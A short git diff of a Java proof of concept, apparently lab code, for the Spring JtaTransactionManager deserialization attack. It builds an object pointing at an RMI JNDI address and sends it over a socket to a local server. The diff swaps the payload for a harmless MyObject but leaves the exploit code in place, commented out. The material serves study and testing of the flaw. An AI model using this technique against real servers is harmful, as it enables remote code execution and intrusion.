@@ -53,6 +53,8 @@ public class SpringPOC {
     public static void sendPayload() throws Exception {
         // jndi的调用地址
         String jndiAddress = "rmi://127.0.0.1:1999/Object";
+
+        // 如果不使用
         // 实例化JtaTransactionManager对象，并且初始化UserTransactionName成员变量
         JtaTransactionManager object = new JtaTransactionManager();
         object.setUserTransactionName(jndiAddress);
@@ -60,7 +62,8 @@ public class SpringPOC {
         Socket socket = new Socket("127.0.0.1", 9999);
         System.out.println("Sending object to server...");
         ObjectOutputStream objectOutputStream = new ObjectOutputStream(socket.getOutputStream());
-        objectOutputStream.writeObject(object);
+        objectOutputStream.writeObject(new MyObject());
+//        objectOutputStream.writeObject(object);
         objectOutputStream.flush();
         socket.close();
     }
